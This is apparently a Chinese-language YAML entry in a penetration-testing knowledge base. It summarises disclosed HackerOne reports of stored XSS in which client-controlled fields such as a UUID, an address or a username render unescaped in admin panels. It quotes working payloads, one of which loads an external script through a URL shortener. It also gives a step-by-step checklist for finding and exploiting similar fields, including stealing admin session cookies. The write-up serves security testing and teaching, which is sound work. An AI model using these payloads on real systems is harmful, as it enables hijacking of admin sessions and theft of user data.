@@ -1,0 +1,118 @@
+name: "客户端可自定义标识符字段（UUID）——服务端信任其格式不做转义，注入 XSS 到管理面板"
+id: "CLIENT_SUPPLIED_IDENTIFIER_XSS"
+applicable: "blackbox"
+phase: "input"
+also_phases: ["authz"]
+tags: ["xss", "stored-xss", "uuid", "client-controlled-id", "admin-panel", "identifier-injection", "trust-boundary", "url-shortener"]
+source: "https://hackerone.com/reports/249131"
+
+# ——— L3 核心 ———
+
+observation: >
+  用户注册/更新接口允许客户端通过 POST 参数 uuid= 自行指定 UUID 值，
+  虽有字符长度限制，但未限制字符集。UUID 值被直接嵌入 YUI.namespace 的 JS 变量中，
+  格式为 JSON 字符串值。
+  (原文: "I found an interesting bug where the system allows a user to create their own UUIDs.
+  There are character length restrictions on this action, however it's not bound
+  to a specific set of characters.")
+
+hypothesis: >
+  UUID 字段通常被开发者视为系统生成的安全值，不会对其做 HTML/JS 转义。
+  若客户端可控制 UUID 内容且注入 script 标签，则在所有显示 UUID 的页面（包括管理面板）
+  均会触发 stored XSS。
+  (原文: "I'm quite confident this will be executed on admin panels and anywhere else
+  a UUID is displayed, since sanitization on that attribute is highly unlikely.")
+
+action_result: >
+  攻击成功：
+  1. POST /c/user 接口发送 uuid=</script><script src=//is.gd/z0i2sU> 作为 UUID 值
+  2. 生成的 HTML 中：YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//is.gd/z0i2sU>","firstName":null,...}
+  3. 闭合原有 script 标签后注入外部脚本，利用 URL 缩短服务解决字符长度限制
+  4. 不需要闭合 </script> 标签——页面原有的结束标签自动配对
+  5. 通过邮件确认链接可触发 XSS：https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=...
+  (原文: "I was lucky I didn't need to add the closing script tag, because the one
+  at the end of the line takes care of it.")
+
+why_here_first: >
+  之前发现过类似问题（#246806），推测 UUID 这类标识符字段在管理面板不会被转义。
+  (原文: "This attack is similar in the way to #246806, except I'm quite confident
+  this will be executed on admin panels and anywhere else a UUID is displayed,
+  since sanitization on that attribute is highly unlikely.")
+
+chaining: >
+  1. 客户端可控 UUID（输入验证缺失）+ 服务端不转义 UUID 输出（输出编码缺失）
+     → stored XSS
+  2. UUID 在管理面板显示 → 攻击者可盗取管理员 session cookie
+  3. URL 缩短服务绕过字符长度限制 → 使可用 payload 空间足够加载完整外部脚本
+
+# ——— 落地检查清单 ———
+
+approach: >
+  寻找允许客户端提供"标识符"类参数（UUID、user_id、device_id、session_name 等）的接口，
+  这些字段通常被开发者视为机器生成的安全值，不会对其做 HTML/JS 转义。
+  注入 XSS payload 后检查是否在管理面板或其他上下文中被渲染。
+
+reasoning_chain:
+  - "问：注册/创建/更新接口是否接受客户端提供的标识符字段（uuid、id、device_id、client_id）？"
+  - "验证：将标识符字段改为非标准值（如 test<>\"'），检查服务端是否接受？是否有字符集/格式校验？"
+  - "问：该标识符值在页面 HTML/JS 中是否被直接嵌入而未转义？（查看页面源码搜索提交的值）"
+  - "如果有长度限制 → 问：能否使用 URL 缩短服务（is.gd、bit.ly）将外部脚本 URL 压缩到限制内？"
+  - "问：标识符是否嵌入 JSON/JS 上下文？如果在 <script> 标签内的 JSON 字符串中，能否通过 </script> 闭合标签并注入新 script？"
+  - "问：该标识符是否在管理面板、后台报表、日志页面等高价值上下文中显示？"
+  - "问：是否存在其他类似的'机器生成值'字段（transaction_id、order_ref、tracking_code）可测试同样手法？"
+  - "扩展：检查 API 响应中的标识符字段是否被前端框架的 v-html / dangerouslySetInnerHTML 渲染"
+
+vuln_root: >
+  开发者假设 UUID 等标识符字段是系统生成的、格式固定的安全值（如 8-4-4-4-12 hex），
+  因此不对其做输出转义；但接口允许客户端自行提供该值，且未在服务端校验格式，
+  导致攻击者可注入任意内容并在所有显示该字段的上下文中触发 XSS。
+
+transferable_to:
+  - "任何允许客户端提供 UUID/ID 字段的 REST API（用户注册、设备注册、订单创建）"
+  - "管理面板/后台系统中显示客户端提交的标识符字段的场景"
+  - "嵌入 JSON 数据到 <script> 标签中的模板渲染模式（YUI、Backbone、服务端渲染 JS 变量）"
+  - "移动 App 后端——device_id / installation_id 等字段通常不做转义"
+  - "IoT 设备管理平台——设备注册时的 serial_number、mac_address 等字段"
+
+cases:
+  - url: "https://hackerone.com/reports/249131"
+    author: "cache-money (Tanner)"
+    platform: "Upserve (app.upserve.com)"
+    bounty: "$1,500"
+    note: >
+      POST /c/user 接口允许客户端自定义 uuid 参数，注入 </script><script src=//is.gd/z0i2sU>
+      利用 URL 缩短绕过长度限制，触发 stored XSS。UUID 嵌入 YUI.namespace JS 变量，
+      在用户和管理面板均渲染。High severity。
+  - url: "https://hackerone.com/reports/419731"
+    author: "sandeep_hodkasia"
+    platform: "Zomato (www.zomato.com)"
+    bounty: "有奖金（金额未公开）"
+    note: >
+      no-content 公开。下单时在地址字段注入 "><script>alert(0);</script>（实际使用
+      XSS Hunter），当客服在管理后台查看订单详情时触发 Blind Stored XSS。
+      (团队摘要: "@sandeep_hodkasia added \"><script>alert(0);</script> in address
+      field while placing an order. XSS triggered when one of our support agent
+      viewed the order details.")
+      approach 相同：客户端可控的"业务数据"字段（地址）被管理面板不转义渲染。
+  - url: "https://hackerone.com/reports/472470"
+    author: "cablej"
+    platform: "Uber (manage.jumpbikes.com)"
+    severity: "Critical"
+    bounty: "有赏金（金额未公开）"
+    note: >
+      no-content 公开。用户名字段注入 XSS payload，在 Jump Bikes 管理面板中触发
+      Stored XSS，暴露用户活动、个人信息和计费信息。
+      (团队摘要: "By setting a user's name to an XSS payload, a user was able to inject
+      JavaScript which was executed on the administrative panel for Jump bikes,
+      allowing complete compromise of the panel, exposing user activity, personal
+      information and billing information.")
+      approach 相同：客户端可控的用户名字段被管理面板不转义渲染。
+  - url: "https://hackerone.com/reports/117449"
+    author: "nismo"
+    platform: "Shopify (Admin Site)"
+    bounty: "有赏金（金额未公开）"
+    severity: "Medium（XSS）"
+    note: >
+      创建 Draft Order 时在产品名称中注入 "><img src=x onerror=prompt('XSSP')>，
+      完成订单后在 Timeline 中引用该 Draft 时 XSS 触发。
+      approach 相同：业务数据字段（产品名称）跨上下文（Timeline 引用）渲染时未转义。
